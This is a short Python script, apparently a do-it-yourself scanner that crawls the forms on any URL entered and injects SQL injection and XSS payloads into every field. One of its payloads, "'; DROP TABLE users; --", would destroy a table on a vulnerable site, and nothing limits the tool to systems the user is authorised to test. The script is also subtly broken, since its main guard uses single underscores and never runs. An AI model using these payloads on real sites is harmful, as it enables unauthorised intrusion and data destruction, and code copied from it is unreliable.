import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# SQLi and XSS payloads
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

def get_forms(url):
    res = requests.get(url)
    soup = BeautifulSoup(res.content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        details["inputs"].append({"type": input_type, "name": input_name})
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["name"]:
            data[input["name"]] = value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_xss_sqli(url):
    forms = get_forms(url)
    print(f"[*] Detected {len(forms)} forms on {url}")

    for i, form in enumerate(forms):
        form_details = get_form_details(form)

        # Check SQL Injection
        for payload in SQLI_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if "sql" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[!] Possible SQL Injection detected on form #{i+1} with payload: {payload}")

        # Check XSS
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if payload in response.text:
                print(f"[!] Possible XSS vulnerability detected on form #{i+1} with payload: {payload}")

if _name_ == "_main_":
    target = input("Enter the URL to scan: ")
    scan_xss_sqli(target)
